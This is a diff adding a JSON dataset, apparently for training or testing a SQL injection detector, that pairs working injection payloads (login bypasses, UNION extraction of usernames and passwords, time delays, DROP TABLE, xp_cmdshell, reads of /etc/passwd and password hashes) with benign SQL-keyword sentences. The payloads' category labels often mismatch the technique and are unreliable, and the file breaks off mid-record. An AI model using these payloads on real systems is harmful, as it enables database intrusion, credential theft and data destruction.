@@ -1,0 +1,1346 @@
+[
+  {
+    "text": "' OR '1'='1' --",
+    "label": "attack",
+    "category": "union_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "' OR '1'='1' /*",
+    "label": "attack",
+    "category": "time_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "admin' #",
+    "label": "attack",
+    "category": "piggybacked",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' OR '1'='1",
+    "label": "attack",
+    "category": "blind",
+    "source": "template-sqli"
+  },
+  {
+    "text": "') OR ('1'='1",
+    "label": "attack",
+    "category": "error_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "' OR 1=1--",
+    "label": "attack",
+    "category": "tautology",
+    "source": "template-sqli"
+  },
+  {
+    "text": "' OR 1=1#",
+    "label": "attack",
+    "category": "union_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "' OR 'x'='x",
+    "label": "attack",
+    "category": "boolean_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1 OR 1=1--",
+    "label": "attack",
+    "category": "comment_injection",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND '1'='1",
+    "label": "attack",
+    "category": "blind",
+    "source": "template-sqli"
+  },
+  {
+    "text": "' UNION SELECT NULL--",
+    "label": "attack",
+    "category": "error_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "' UNION SELECT NULL,NULL--",
+    "label": "attack",
+    "category": "tautology",
+    "source": "template-sqli"
+  },
+  {
+    "text": "' UNION SELECT NULL,NULL,NULL--",
+    "label": "attack",
+    "category": "union_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "' UNION ALL SELECT username,password FROM users--",
+    "label": "attack",
+    "category": "time_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "' UNION SELECT table_name FROM information_schema.tables--",
+    "label": "attack",
+    "category": "boolean_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "' UNION SELECT column_name FROM information_schema.columns--",
+    "label": "attack",
+    "category": "piggybacked",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' ORDER BY 1--",
+    "label": "attack",
+    "category": "comment_injection",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' ORDER BY 10--",
+    "label": "attack",
+    "category": "blind",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' ORDER BY 100--",
+    "label": "attack",
+    "category": "error_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1'; WAITFOR DELAY '0:0:5'--",
+    "label": "attack",
+    "category": "union_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND pg_sleep(5)--",
+    "label": "attack",
+    "category": "time_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+    "label": "attack",
+    "category": "boolean_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "'; DROP TABLE users;--",
+    "label": "attack",
+    "category": "piggybacked",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1; DROP TABLE students--",
+    "label": "attack",
+    "category": "comment_injection",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1'; DELETE FROM accounts--",
+    "label": "attack",
+    "category": "blind",
+    "source": "template-sqli"
+  },
+  {
+    "text": "'; INSERT INTO users VALUES('h','p');--",
+    "label": "attack",
+    "category": "error_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "'; EXEC xp_cmdshell('whoami');--",
+    "label": "attack",
+    "category": "tautology",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND 1=CONVERT(int,(SELECT @@version))--",
+    "label": "attack",
+    "category": "union_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
+    "label": "attack",
+    "category": "time_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND updatexml(1,concat(0x7e,version()),1)--",
+    "label": "attack",
+    "category": "boolean_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT COUNT(*) FROM sysobjects)>0--",
+    "label": "attack",
+    "category": "piggybacked",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND SUBSTRING(@@version,1,1)='5'--",
+    "label": "attack",
+    "category": "comment_injection",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--",
+    "label": "attack",
+    "category": "blind",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT password FROM users WHERE username='admin')='x'--",
+    "label": "attack",
+    "category": "error_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND EXISTS(SELECT * FROM users WHERE username='admin')--",
+    "label": "attack",
+    "category": "tautology",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' GROUP BY columnnames HAVING 1=1--",
+    "label": "attack",
+    "category": "union_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' PROCEDURE ANALYSE(extractvalue(rand(),concat(0x3a,version())),1)--",
+    "label": "attack",
+    "category": "time_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND GTID_SUBSET(@@version,0)--",
+    "label": "attack",
+    "category": "boolean_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND EXP(~(SELECT * FROM (SELECT version())a))--",
+    "label": "attack",
+    "category": "piggybacked",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND MID(VERSION(),1,1)='5'--",
+    "label": "attack",
+    "category": "comment_injection",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND 1=0 UNION ALL SELECT 'admin','pass'--",
+    "label": "attack",
+    "category": "blind",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' OR 1=1 LIMIT 1--",
+    "label": "attack",
+    "category": "error_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND 1=1#",
+    "label": "attack",
+    "category": "tautology",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND 1=2#",
+    "label": "attack",
+    "category": "union_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "x' OR 1=1--",
+    "label": "attack",
+    "category": "boolean_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "x' OR 'a'='a",
+    "label": "attack",
+    "category": "piggybacked",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1') OR ('1'='1",
+    "label": "attack",
+    "category": "comment_injection",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1')) OR (('1'='1",
+    "label": "attack",
+    "category": "blind",
+    "source": "template-sqli"
+  },
+  {
+    "text": "' OR 1=1 INTO OUTFILE '/tmp/x'--",
+    "label": "attack",
+    "category": "error_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND LOAD_FILE('/etc/passwd')--",
+    "label": "attack",
+    "category": "tautology",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT LOAD_FILE(0x2F6574632F706173737764))--",
+    "label": "attack",
+    "category": "union_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' UNION SELECT 1,2,3,4,5--",
+    "label": "attack",
+    "category": "time_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' UNION SELECT username,password FROM admin--",
+    "label": "attack",
+    "category": "boolean_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
+    "label": "attack",
+    "category": "piggybacked",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT table_name FROM information_schema.tables LIMIT 1)='users'--",
+    "label": "attack",
+    "category": "comment_injection",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT current_database())='app'--",
+    "label": "attack",
+    "category": "blind",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT current_user)='postgres'--",
+    "label": "attack",
+    "category": "error_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT version()) LIKE 'PostgreSQL%'--",
+    "label": "attack",
+    "category": "tautology",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT @@version) LIKE 'Microsoft%'--",
+    "label": "attack",
+    "category": "union_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT banner FROM v$version WHERE ROWNUM=1) IS NOT NULL--",
+    "label": "attack",
+    "category": "time_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT user FROM dual)='SCOTT'--",
+    "label": "attack",
+    "category": "boolean_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT COUNT(*) FROM all_tables)>0--",
+    "label": "attack",
+    "category": "piggybacked",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT COUNT(*) FROM pg_catalog.pg_tables)>0--",
+    "label": "attack",
+    "category": "comment_injection",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT relname FROM pg_class LIMIT 1)='users'--",
+    "label": "attack",
+    "category": "blind",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT schema_name FROM information_schema.schemata LIMIT 1)='public'--",
+    "label": "attack",
+    "category": "error_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1)='password'--",
+    "label": "attack",
+    "category": "tautology",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND STRCMP(SUBSTRING((SELECT password FROM users LIMIT 1),1,1),CHAR(97))=0--",
+    "label": "attack",
+    "category": "union_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+    "label": "attack",
+    "category": "time_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version())) USING utf8)))--",
+    "label": "attack",
+    "category": "boolean_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND 1=CAST((SELECT version()) AS int)--",
+    "label": "attack",
+    "category": "piggybacked",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT COUNT(*) FROM pg_sleep(0))>=0--",
+    "label": "attack",
+    "category": "comment_injection",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT 1 FROM pg_sleep(5)) IS NOT NULL--",
+    "label": "attack",
+    "category": "blind",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT COUNT(*) FROM users WHERE username LIKE 'a%')>0--",
+    "label": "attack",
+    "category": "error_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>0--",
+    "label": "attack",
+    "category": "tautology",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--",
+    "label": "attack",
+    "category": "union_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT COUNT(*) FROM mysql.user)>0--",
+    "label": "attack",
+    "category": "time_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT host FROM mysql.user LIMIT 1) IS NOT NULL--",
+    "label": "attack",
+    "category": "boolean_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT user FROM mysql.user LIMIT 1) IS NOT NULL--",
+    "label": "attack",
+    "category": "piggybacked",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT authentication_string FROM mysql.user LIMIT 1) IS NOT NULL--",
+    "label": "attack",
+    "category": "comment_injection",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT COUNT(*) FROM sqlite_master)>0--",
+    "label": "attack",
+    "category": "blind",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT name FROM sqlite_master WHERE type='table' LIMIT 1)='users'--",
+    "label": "attack",
+    "category": "error_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT sql FROM sqlite_master LIMIT 1) IS NOT NULL--",
+    "label": "attack",
+    "category": "tautology",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT COUNT(*) FROM pragma_table_info('users'))>0--",
+    "label": "attack",
+    "category": "union_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT name FROM pragma_table_info('users') LIMIT 1)='id'--",
+    "label": "attack",
+    "category": "time_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT COUNT(*) FROM sys.tables)>0--",
+    "label": "attack",
+    "category": "boolean_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT name FROM sys.tables LIMIT 1)='users'--",
+    "label": "attack",
+    "category": "piggybacked",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT COUNT(*) FROM sys.columns WHERE object_id=OBJECT_ID('users'))>0--",
+    "label": "attack",
+    "category": "comment_injection",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('users') LIMIT 1)='password'--",
+    "label": "attack",
+    "category": "blind",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT COUNT(*) FROM sys.databases)>0--",
+    "label": "attack",
+    "category": "error_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT name FROM sys.databases LIMIT 1)='master'--",
+    "label": "attack",
+    "category": "tautology",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT COUNT(*) FROM sysusers)>0--",
+    "label": "attack",
+    "category": "union_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT name FROM sysusers LIMIT 1)='dbo'--",
+    "label": "attack",
+    "category": "time_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT COUNT(*) FROM master..syslogins)>0--",
+    "label": "attack",
+    "category": "boolean_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT name FROM master..syslogins LIMIT 1)='sa'--",
+    "label": "attack",
+    "category": "piggybacked",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT password FROM master..syslogins WHERE name='sa') IS NOT NULL--",
+    "label": "attack",
+    "category": "comment_injection",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT COUNT(*) FROM pg_roles)>0--",
+    "label": "attack",
+    "category": "blind",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT rolname FROM pg_roles LIMIT 1)='postgres'--",
+    "label": "attack",
+    "category": "error_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT rolpassword FROM pg_authid WHERE rolname='postgres') IS NOT NULL--",
+    "label": "attack",
+    "category": "tautology",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT COUNT(*) FROM pg_stat_activity)>0--",
+    "label": "attack",
+    "category": "union_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT usename FROM pg_stat_activity LIMIT 1) IS NOT NULL--",
+    "label": "attack",
+    "category": "time_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT query FROM pg_stat_activity LIMIT 1) IS NOT NULL--",
+    "label": "attack",
+    "category": "boolean_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT COUNT(*) FROM pg_locks)>0--",
+    "label": "attack",
+    "category": "piggybacked",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT locktype FROM pg_locks LIMIT 1) IS NOT NULL--",
+    "label": "attack",
+    "category": "comment_injection",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT COUNT(*) FROM pg_database)>0--",
+    "label": "attack",
+    "category": "blind",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT datname FROM pg_database LIMIT 1)='postgres'--",
+    "label": "attack",
+    "category": "error_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT COUNT(*) FROM pg_namespace)>0--",
+    "label": "attack",
+    "category": "tautology",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT nspname FROM pg_namespace LIMIT 1)='public'--",
+    "label": "attack",
+    "category": "union_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT COUNT(*) FROM pg_attribute)>0--",
+    "label": "attack",
+    "category": "time_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "1' AND (SELECT attname FROM pg_attribute LIMIT 1)='id'--",
+    "label": "attack",
+    "category": "boolean_based",
+    "source": "template-sqli"
+  },
+  {
+    "text": "Insert the row after reviewing the data.",
+    "label": "benign",
+    "category": "benign_keyword_union",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Update the profile and delete old photos.",
+    "label": "benign",
+    "category": "benign_keyword_where",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "The union representative attends meetings.",
+    "label": "benign",
+    "category": "benign_keyword_exec",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Execute the rollout plan from the doc.",
+    "label": "benign",
+    "category": "benign_keyword_drop",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Convert and cast values in the spreadsheet.",
+    "label": "benign",
+    "category": "benign_keyword_union",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Select all answers that apply on the form.",
+    "label": "benign",
+    "category": "benign_keyword_where",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Delete duplicates from the export manually.",
+    "label": "benign",
+    "category": "benign_keyword_exec",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "From the table we can read clear trends.",
+    "label": "benign",
+    "category": "benign_keyword_select",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Declare variables before the loop runs.",
+    "label": "benign",
+    "category": "benign_keyword_drop",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Order pizza for the team lunch today.",
+    "label": "benign",
+    "category": "benign_keyword_where",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Group the results by product category.",
+    "label": "benign",
+    "category": "benign_keyword_exec",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Wait for the download to finish please.",
+    "label": "benign",
+    "category": "benign_keyword_select",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Version 2.0 ships next month.",
+    "label": "benign",
+    "category": "benign_keyword_drop",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Schema changes require a migration plan.",
+    "label": "benign",
+    "category": "benign_keyword_union",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Public schema holds application tables.",
+    "label": "benign",
+    "category": "benign_keyword_where",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Session timeout is thirty minutes.",
+    "label": "benign",
+    "category": "benign_keyword_exec",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Password reset link expires in an hour.",
+    "label": "benign",
+    "category": "benign_keyword_select",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Admin panel is for staff members only.",
+    "label": "benign",
+    "category": "benign_keyword_drop",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Oracle database is legacy in this org.",
+    "label": "benign",
+    "category": "benign_keyword_union",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Postgres is our primary datastore.",
+    "label": "benign",
+    "category": "benign_keyword_where",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "MySQL replication lag is monitored.",
+    "label": "benign",
+    "category": "benign_keyword_exec",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "SQL keywords appear in this tutorial.",
+    "label": "benign",
+    "category": "benign_keyword_select",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "The teacher asked students to select books.",
+    "label": "benign",
+    "category": "benign_keyword_drop",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Union of sets is taught in math class.",
+    "label": "benign",
+    "category": "benign_keyword_union",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Drop the ball is slang for failing.",
+    "label": "benign",
+    "category": "benign_keyword_where",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Insert coin to continue says the arcade.",
+    "label": "benign",
+    "category": "benign_keyword_exec",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Update your resume before applying.",
+    "label": "benign",
+    "category": "benign_keyword_select",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Delete the draft when you are done.",
+    "label": "benign",
+    "category": "benign_keyword_drop",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Select a date from the calendar widget.",
+    "label": "benign",
+    "category": "benign_keyword_union",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Where clause filters rows in SQL tutorials.",
+    "label": "benign",
+    "category": "benign_keyword_where",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Join two tables on the foreign key.",
+    "label": "benign",
+    "category": "benign_keyword_exec",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Having aggregates after group by.",
+    "label": "benign",
+    "category": "benign_keyword_select",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Order results by created date descending.",
+    "label": "benign",
+    "category": "benign_keyword_drop",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Limit results to ten per page.",
+    "label": "benign",
+    "category": "benign_keyword_union",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Offset pagination skips first rows.",
+    "label": "benign",
+    "category": "benign_keyword_where",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Commit the transaction after validation.",
+    "label": "benign",
+    "category": "benign_keyword_exec",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Rollback if any step fails.",
+    "label": "benign",
+    "category": "benign_keyword_select",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Grant read access to the analytics role.",
+    "label": "benign",
+    "category": "benign_keyword_drop",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Revoke write permission from guest users.",
+    "label": "benign",
+    "category": "benign_keyword_union",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Create index on frequently queried column.",
+    "label": "benign",
+    "category": "benign_keyword_where",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Alter table add column with default.",
+    "label": "benign",
+    "category": "benign_keyword_exec",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Truncate staging table after ETL.",
+    "label": "benign",
+    "category": "benign_keyword_select",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Vacuum analyze keeps statistics fresh.",
+    "label": "benign",
+    "category": "benign_keyword_drop",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Explain plan shows query cost.",
+    "label": "benign",
+    "category": "benign_keyword_union",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Prepare statement for repeated queries.",
+    "label": "benign",
+    "category": "benign_keyword_where",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Bind parameters prevent injection in ORMs.",
+    "label": "benign",
+    "category": "benign_keyword_exec",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Escape user input before concatenating.",
+    "label": "benign",
+    "category": "benign_keyword_select",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Use parameterized queries in production.",
+    "label": "benign",
+    "category": "benign_keyword_drop",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Never trust client-side validation alone.",
+    "label": "benign",
+    "category": "benign_keyword_union",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Audit logs capture who changed what.",
+    "label": "benign",
+    "category": "benign_keyword_where",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Backup runs nightly at two AM.",
+    "label": "benign",
+    "category": "benign_keyword_exec",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Restore drill happens every quarter.",
+    "label": "benign",
+    "category": "benign_keyword_select",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Replication failover is automated.",
+    "label": "benign",
+    "category": "benign_keyword_drop",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Read replica serves analytics queries.",
+    "label": "benign",
+    "category": "benign_keyword_union",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Connection pool limits concurrent clients.",
+    "label": "benign",
+    "category": "benign_keyword_where",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Slow query log flags expensive selects.",
+    "label": "benign",
+    "category": "benign_keyword_exec",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Index-only scan avoids heap fetch.",
+    "label": "benign",
+    "category": "benign_keyword_select",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Partial index filters active rows.",
+    "label": "benign",
+    "category": "benign_keyword_drop",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Materialized view refreshes hourly.",
+    "label": "benign",
+    "category": "benign_keyword_union",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "CTE simplifies recursive tree queries.",
+    "label": "benign",
+    "category": "benign_keyword_where",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Window functions rank sales by region.",
+    "label": "benign",
+    "category": "benign_keyword_exec",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Pivot report summarizes monthly revenue.",
+    "label": "benign",
+    "category": "benign_keyword_select",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Unpivot normalizes wide spreadsheet import.",
+    "label": "benign",
+    "category": "benign_keyword_drop",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "JSON column stores flexible metadata.",
+    "label": "benign",
+    "category": "benign_keyword_union",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Array column holds tag list.",
+    "label": "benign",
+    "category": "benign_keyword_where",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Full text search indexes article body.",
+    "label": "benign",
+    "category": "benign_keyword_exec",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Geospatial index supports map queries.",
+    "label": "benign",
+    "category": "benign_keyword_select",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Partition table by month for retention.",
+    "label": "benign",
+    "category": "benign_keyword_drop",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Sharding splits users by tenant id.",
+    "label": "benign",
+    "category": "benign_keyword_union",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Foreign key enforces referential integrity.",
+    "label": "benign",
+    "category": "benign_keyword_where",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Check constraint validates email format.",
+    "label": "benign",
+    "category": "benign_keyword_exec",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Unique constraint prevents duplicate slug.",
+    "label": "benign",
+    "category": "benign_keyword_select",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Not null constraint requires title field.",
+    "label": "benign",
+    "category": "benign_keyword_drop",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Default value sets created_at timestamp.",
+    "label": "benign",
+    "category": "benign_keyword_union",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Sequence generates monotonic ids.",
+    "label": "benign",
+    "category": "benign_keyword_where",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "UUID primary key avoids hot spots.",
+    "label": "benign",
+    "category": "benign_keyword_exec",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Soft delete sets deleted_at column.",
+    "label": "benign",
+    "category": "benign_keyword_select",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Optimistic locking uses version column.",
+    "label": "benign",
+    "category": "benign_keyword_drop",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Pessimistic lock blocks concurrent update.",
+    "label": "benign",
+    "category": "benign_keyword_union",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Deadlock detector picks victim transaction.",
+    "label": "benign",
+    "category": "benign_keyword_where",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Isolation level read committed is default.",
+    "label": "benign",
+    "category": "benign_keyword_exec",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Serializable prevents phantom reads.",
+    "label": "benign",
+    "category": "benign_keyword_select",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Repeatable read keeps snapshot consistent.",
+    "label": "benign",
+    "category": "benign_keyword_drop",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Read uncommitted allows dirty reads.",
+    "label": "benign",
+    "category": "benign_keyword_union",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Two phase commit coordinates distributed tx.",
+    "label": "benign",
+    "category": "benign_keyword_where",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Saga pattern compensates failed steps.",
+    "label": "benign",
+    "category": "benign_keyword_exec",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Outbox table publishes domain events.",
+    "label": "benign",
+    "category": "benign_keyword_select",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Idempotent consumer handles duplicates.",
+    "label": "benign",
+    "category": "benign_keyword_drop",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Migration tool versions schema changes.",
+    "label": "benign",
+    "category": "benign_keyword_union",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Seed script inserts demo data.",
+    "label": "benign",
+    "category": "benign_keyword_where",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Fixture loads test database state.",
+    "label": "benign",
+    "category": "benign_keyword_exec",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Transaction wraps multi-table update.",
+    "label": "benign",
+    "category": "benign_keyword_select",
+    "source": "template-sqli-benign"
+  },
+  {
+    "text": "Batch insert improves bulk import speed.",
+    "label": "benign",
+    "category": "benign_keyword_drop",
+    "source": "template-sqli-benign"
+  },
+  {
